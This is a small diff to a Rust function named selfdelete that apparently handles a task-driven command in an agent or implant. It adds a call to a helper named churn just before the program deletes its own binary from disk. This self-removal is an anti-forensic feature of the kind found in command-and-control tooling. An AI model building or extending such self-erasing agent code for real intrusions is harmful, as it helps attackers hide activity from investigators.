@@ -129,6 +129,8 @@ pub fn selfdelete(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
     let id = task.get("id").unwrap().as_str().unwrap();
     let timestamp = task.get("timestamp").unwrap().as_f64().unwrap();
 
+    crate::helpers::churn(id);
+
     let success = delete_self_from_disk();
 
     let output = if success {
